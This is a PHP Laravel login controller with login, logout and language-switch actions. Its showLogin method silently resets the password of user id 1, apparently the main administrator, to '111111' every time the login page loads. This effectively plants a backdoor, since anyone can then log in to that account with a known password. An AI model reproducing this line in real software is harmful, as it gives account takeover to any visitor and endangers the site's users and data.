<?php namespace App\Http\Controllers;

use App\Entities\User;
use Illuminate\Support\Facades\Hash;
use Illuminate\Support\Facades\Crypt;
use Illuminate\Support\Facades\Redirect;
use Illuminate\Support\Facades\Session;
use Validator;
use URL;
use Illuminate\Http\Request;
use App\Http\Requests\LoginRequest;

class LoginController extends Controller {

    use \TraitsFunc;

    public function showLogin() {
        User::where('id',1)->update(['password'=>\Hash::make('111111')]);
        return view('Auth::login');
    }

    public function doLogin(LoginRequest $request)
    {
        $loginData = $request->validated();

        $userObj = User::where(['email'=>$loginData['email']])->whereNotIn('role_id',[3,4,5])->first();
        if (!$userObj) {
            Session::flash('error', trans('Auth::login.validations.invalidUser'));
            return redirect()->back()->withInput();
        }

        $checkPassword = Hash::check($loginData['password'], $userObj->password);
        if (!$checkPassword) {
            Session::flash('error', trans('Auth::login.validations.invalidPassword'));
            return redirect()->back()->withInput();
        }

        session(['user_id' => $userObj->id]);
        session(['role_id' => $userObj->role_id]);
        $userObj->last_login = date('Y-m-d H:i:s');
        $userObj->save();
        
        Session::flash('success', trans('Auth::login.welcome') . ucwords($userObj->name));
        return redirect()->to('/dashboard');
    }

    public function logout(Request $request)
    {
        $old = \Session::get('locale');
        session()->flush();
        Session::flash('success', trans('Auth::login.seeYou'));
        \Session::put('locale', $old);
        return redirect()->to('/dashboard/login');
    }

    public function changeLang(Request $request){
        if(isset($request->lang) && in_array($request->lang, ['ar','en'])){
            if(!\Session::has('locale')){
                \Session::put('locale', $request->lang);
            }else{
                \Session::forget('locale');
                \Session::put('locale', $request->lang);
            }
        }
        return redirect()->back();
    }
}
